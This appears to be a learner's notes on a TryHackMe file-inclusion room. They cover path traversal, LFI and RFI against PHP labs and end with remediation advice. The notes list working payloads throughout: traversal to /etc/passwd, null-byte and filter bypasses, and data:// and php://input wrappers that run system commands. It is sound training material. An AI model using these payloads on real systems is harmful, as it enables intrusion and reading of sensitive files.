# File Inclusion - LFI / RFI / Path Traversal (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities II (room 3)
- **Completed:** 2026-10-10 - **Target:** <ip> (over VPN)
- Labs on old Apache 2.2.22 / PHP 5.2 (null byte works); challenges on nginx/PHP; param = `file` (GET).

Path traversal = read raw file (file_get_contents). LFI = include() EXECUTES the file (RCE possible).
RFI = include a remote/attacker file (needs allow_url_include). Root cause: user input into a
file-handling function without validation.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 3 | PHP function causing path traversal | *(find it yourself)* |
| 4 | Lab1 read /etc/passwd (URI) | *(find it yourself)* |
| 4 | Lab2 include directory | *(find it yourself)* |
| 5 | Lab3 read /etc/passwd (URI) | *(find it yourself)* |
| 5 | Lab4 traversal function | *(find it yourself)* |
| 5 | Lab6 required directory | *(find it yourself)* |
| 5 | Lab6 /etc/os-release VERSION_ID | *(find it yourself)* |
| 7 | Flag1 (/etc/flag1) | *(find it yourself)* |
| 7 | Flag2 (/etc/flag2) | *(find it yourself)* |
| 7 | Flag3 (/etc/flag3) | *(find it yourself)* |
| 7 | Playground RFI hostname | *(find it yourself)* |

## Labs (param = file, GET). Submit ?file=THM to read the error (reveals dir/ext/filter).
- Lab1: include($file), no dir/ext. Absolute path: ?file=/etc/passwd.
- Lab2: include("includes/".$file). Traverse: ?file=../../../../etc/passwd.
- Lab3: include("includes/".$file.".php"). Null-byte (old PHP): ?file=../../../../etc/passwd%00.
- Lab4: file_get_contents($file) with a keyword filter on /etc/passwd. Bypass: ?file=/etc/passwd/.
  (trailing /. resolves to the same file but dodges the string match).
- Lab5: include("includes/".$file), strips ../ (single pass). Bypass: doubled seq
  ?file=....//....//....//....//etc/passwd (removing ../ from ....// leaves ../).
- Lab6: forces input to start with a dir; error "Allowed files at THM-profile folder only".
  ?file=THM-profile/../../../../../etc/os-release -> VERSION_ID *(find it yourself)* (an old Ubuntu Precise release).

## Challenges (/challenges/, ONE nginx container, hostname *(find it yourself)*; each challenge restricts a
## different way but all 3 flags live on the same box).
- Chall1: $file=$_POST['file']; blocks substrings "flag2"/"flag3" then include($file) (no ext,
  wrappers allowed). POST file=/etc/flag1 -> *(find it yourself)*.
  Bypass the flag2/flag3 string block with a data:// wrapper (base64 input has no "flag3" literal):
    file=data://text/plain;base64,<b64 of `<?php echo file_get_contents('/etc/flag3');?>`>
  -> read /etc/flag2 = *(find it yourself)*, /etc/flag3 = *(find it yourself)*.
- Chall2: include("includes/".$cookie.".php") from the THM COOKIE. Set-Cookie: THM=Guest.
  Cookie THM=../../../../etc/flag2%00 -> *(find it yourself)* (null byte drops .php).
- Chall3: $_GET['file'] with a filter that strips ALL non-letters ([^a-zA-Z]) then appends .php -
  so a path to /etc/flag3 is impossible via chall3 itself; but same container, so chall1's data://
  bypass yields /etc/flag3 = *(find it yourself)*.

## Playground RCE (RFI)
/playground.php?file= on the old-PHP labs box. True RFI = host http://you/cmd.txt with
`<?php system('hostname');?>` and include it (needs allow_url_include; and an inbound-reachable
host - our VPN inbound is firewalled, use the AttackBox). Equivalent RCE WITHOUT hosting:
  ?file=data://text/plain;base64,<b64 of `<?php system('hostname');?>>`   OR  ?file=php://input (POST body)
-> hostname = *(find it yourself)*.

## Key techniques / bypasses
- Error messages reveal the prepended dir, appended extension, and full disk path (how many ../).
- Null byte %00 (PHP < 5.3.4) truncates an appended .php.
- Keyword filter on a path: append /. (resolves same, string differs).
- ../ single-pass strip: double it as ....// so the inner ../ removal leaves a valid ../.
- Forced-dir prefix: start the payload with the required dir then traverse out.
- strpos substring blocklist: use a data:// base64 payload (the forbidden word only appears after
  decode, not in the input string).
- Wrappers for RCE without hosting: data://text/plain;base64,... and php://input.

## Remediation (Task 8)
Allowlist filenames (map input to fixed values), never raw input into include/require/
file_get_contents. Disable allow_url_fopen/allow_url_include. display_errors Off in prod. Keep PHP
updated (null byte patched 5.3.4). WAF as an extra layer only.
